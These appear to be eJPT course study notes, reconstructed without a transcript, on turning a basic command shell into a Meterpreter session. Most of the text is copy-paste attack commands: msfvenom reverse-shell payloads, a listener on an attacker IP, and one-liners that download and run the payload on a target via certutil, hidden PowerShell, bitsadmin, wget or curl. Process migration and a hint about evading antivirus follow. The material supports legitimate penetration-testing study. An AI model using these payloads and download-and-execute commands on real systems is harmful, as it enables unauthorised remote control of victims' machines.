# 04 - Upgrading Command Shells To Meterpreter Shells

Note: No transcript was provided; the steps below reflect the standard eJPT workflow for upgrading a basic command shell (sh/cmd.exe) to a Meterpreter session during post-exploitation.

## What the video covers (Introduction / big picture)
- Why upgrade: Meterpreter provides richer post-exploitation features (file ops, process migration, pivoting/port forwarding, key commands like hashdump, screenshot, etc.) compared to a bare command shell.
- Quick upgrade methods inside Metasploit:
  - sessions -u <id> (uses post/multi/manage/shell_to_meterpreter under the hood)
  - Using the post/multi/manage/shell_to_meterpreter module directly
- Manual upgrade path when your shell is not managed by Metasploit:
  - Generate a Meterpreter payload with msfvenom
  - Serve and transfer it to the target (certutil, PowerShell, wget/curl)
  - Run a multi/handler to catch the session
- Verifying and stabilizing the new Meterpreter session (sysinfo, getuid, migrate)

## Flow (ordered)
1. Confirm you have a working command shell on the target (via Metasploit “shell” session or any other method).
2. If the shell is inside Metasploit:
   - Set LHOST/LPORT
   - Run sessions -u <id> or use post/multi/manage/shell_to_meterpreter
3. If the shell is outside Metasploit:
   - Start a Meterpreter handler
   - Build a Meterpreter payload (msfvenom)
   - Host the payload (HTTP)
   - Download and execute it on the target
4. Catch the Meterpreter session, verify it, and migrate to a stable process (Windows).
5. Clean up dropped files and background handlers when done.

## Tools highlighted
- Metasploit Framework (msfconsole)
  - sessions, post/multi/manage/shell_to_meterpreter
  - exploit/multi/handler
- msfvenom (payload generation)
- Transfer utilities on target:
  - Windows: certutil, PowerShell (Invoke-WebRequest), bitsadmin
  - Linux: wget, curl
- Simple HTTP server (python3 -m http.server)

## Typical command walkthrough (detailed, copy-paste friendly)

Assumptions:
- Attacker IP: 10.10.14.10
- Listener port: 4444
- Existing Metasploit shell session ID: 1

Adjust IP/ports/paths as needed.

### A) One-command upgrade inside Metasploit (recommended when you already have a Metasploit-managed shell)
```
msfconsole
setg LHOST 10.10.14.10
setg LPORT 4444
sessions -l
sessions -u 1
```
- If sessions -u fails or you want more control, use the module explicitly:
```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 10.10.14.10
set LPORT 4444
set HANDLER true
run
```
- Interact with the new Meterpreter session:
```
sessions -l
sessions -i <new_meterpreter_id>
sysinfo
getuid
```

### B) Manual upgrade (Windows) — when your shell is not in Metasploit

1) Start a handler:
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.10
set LPORT 4444
run -j
```

2) Generate the payload:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe -o meter64.exe
```

3) Host it:
```
python3 -m http.server 80
```

4) From the Windows shell on the target, download and execute (pick one method):

- certutil:
```
certutil -urlcache -f http://10.10.14.10/meter64.exe meter64.exe
meter64.exe
```

- PowerShell Invoke-WebRequest:
```
powershell -nop -w hidden -c "iwr -useb http://10.10.14.10/meter64.exe -OutFile $env:TEMP\m.exe; Start-Process $env:TEMP\m.exe"
```

- bitsadmin (legacy):
```
bitsadmin /transfer myJob /download /priority normal http://10.10.14.10/meter64.exe C:\Windows\Temp\m.exe
C:\Windows\Temp\m.exe
```

5) Back in Metasploit, interact and verify:
```
sessions -l
sessions -i <id>
sysinfo
getuid
```

6) Stabilize (Windows): migrate to a stable 64-bit process (e.g., explorer.exe, spoolsv.exe):
```
ps
migrate <pid>
```
- If you landed in a 32-bit Meterpreter on a 64-bit OS, consider:
```
use post/windows/manage/archmigrate
set SESSION <id>
run
```

### C) Manual upgrade (Linux)

1) Start a handler:
```
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.10
set LPORT 4444
run -j
```

2) Generate payload:
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f elf -o meter64.elf
```

3) Host it:
```
python3 -m http.server 8000
```

4) From the Linux shell on the target, download and execute:
```
wget http://10.10.14.10:8000/meter64.elf -O /tmp/m
chmod +x /tmp/m
/tmp/m
```
- Or using curl:
```
curl -o /tmp/m http://10.10.14.10:8000/meter64.elf
chmod +x /tmp/m
/tmp/m
```

5) Verify:
```
sessions -l
sessions -i <id>
sysinfo
getuid
```

### D) Clean up (both platforms)
- Remove dropped binaries from the target if appropriate:
  - Windows: del C:\Windows\Temp\m.exe (or the filename used)
  - Linux: rm /tmp/m (or the filename used)
- Stop background handlers if no longer needed:
```
jobs -l
jobs -K
```

## Practical tips
- Ensure LHOST is reachable from the target (VPN interface like tun0 is common in labs).
- If sessions -u fails, explicitly use post/multi/manage/shell_to_meterpreter or switch to the manual method.
- Choose the correct payload architecture:
  - windows/x64/meterpreter/reverse_tcp for 64-bit
  - windows/meterpreter/reverse_tcp for 32-bit
  - linux/x64 or linux/x86 accordingly
- For egress-restricted targets, try common outbound ports (443, 80).
- After getting Meterpreter on Windows, migrate to a long-lived process to improve stability.
- Keep the handler running in the background (run -j) before executing payloads on the target.
- In clean lab environments, AV/EDR is usually not active; in the real world, in-memory or less signatured approaches are needed.
- If your original shell is not inside Metasploit, the manual path is the most reliable.

## Minimal cheat sheet (one-screen flow)

- Quick upgrade inside Metasploit:
```
setg LHOST 10.10.14.10
setg LPORT 4444
sessions -l
sessions -u 1
# or:
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 10.10.14.10
set LPORT 4444
run
```

- Manual Windows:
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.10
set LPORT 4444
run -j
# new terminal
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe -o meter64.exe
python3 -m http.server 80
# on target shell
certutil -urlcache -f http://10.10.14.10/meter64.exe meter64.exe && meter64.exe
```

- Manual Linux:
```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.10
set LPORT 4444
run -j
# new terminal
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f elf -o meter64.elf
python3 -m http.server 8000
# on target shell
wget http://10.10.14.10:8000/meter64.elf -O /tmp/m && chmod +x /tmp/m && /tmp/m
```

- Verify and stabilize:
```
sessions -l
sessions -i <id>
sysinfo
getuid
ps
migrate <pid>   # Windows
```

## Summary
- The goal is to convert a basic command shell to a powerful Meterpreter session for post-exploitation.
- If your shell is a Metasploit session, use sessions -u or post/multi/manage/shell_to_meterpreter with LHOST/LPORT set.
- If your shell is outside Metasploit, run a handler, generate and transfer a Meterpreter payload, execute it on the target, and catch the session.
- Always verify the session and migrate to a stable process on Windows; clean up artifacts when done.